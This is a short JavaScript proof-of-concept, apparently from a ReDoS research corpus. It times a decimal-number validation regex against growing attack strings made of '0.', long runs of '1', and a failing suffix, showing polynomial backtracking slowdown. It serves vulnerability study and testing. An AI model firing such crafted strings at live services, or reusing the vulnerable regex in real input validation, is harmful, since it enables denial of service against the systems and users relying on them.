/* 1916
 * ^(([1-9]{1}(\d+)?)(\.\d+)?)|([0]\.(\d+)?([1-9]{1})(\d+)?)$
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:"0."+"1"*10000+"!1 __POA(i)"
 */
var REGEX = /^(([1-9]{1}(\d+)?)(\.\d+)?)|([0]\.(\d+)?([1-9]{1})(\d+)?)$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '0.' + '1'.repeat(i*10000) + '!1 __POA(i)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}